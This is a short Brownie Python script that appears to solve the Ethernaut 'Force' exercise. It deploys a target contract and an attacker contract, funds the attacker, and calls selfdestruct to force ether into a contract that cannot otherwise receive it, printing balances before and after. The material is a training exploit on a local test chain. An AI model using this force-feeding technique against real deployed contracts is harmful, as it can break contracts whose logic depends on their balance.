from brownie import *
from web3 import Web3

def deploy_force(owr, usr1):
    fce = Force.deploy({'from':owr})
    dfce = darkForce.deploy(fce.address, {'from':usr1})

    return fce, dfce

def main():
    # get accounts
    owner = accounts[0]
    user1 = accounts[1]
    # deploy contracts
    force, darkforce = deploy_force(owner, user1)
    # check balance before sending tokens
    prev_blnce = force.balance()
    # send tokens to contract dark force
    darkforce.deposit({'from':user1, 'value': 50})
    # store balance
    old_blce = darkforce.balance()
    # destruct dark force contract triggerin migration of tokens to Force contract
    darkforce.destruct({'from':user1})
    # print values
    print(f'[*] Balance dark force, {old_blce}')
    print(f'[*] Balance dark force after selfdestruct, {darkforce.balance()}')
    print(f'[*] Contract Balance Force: {prev_blnce}')
    print(f'[*] Contract Balance Force after selfdestruct: {force.balance()}')
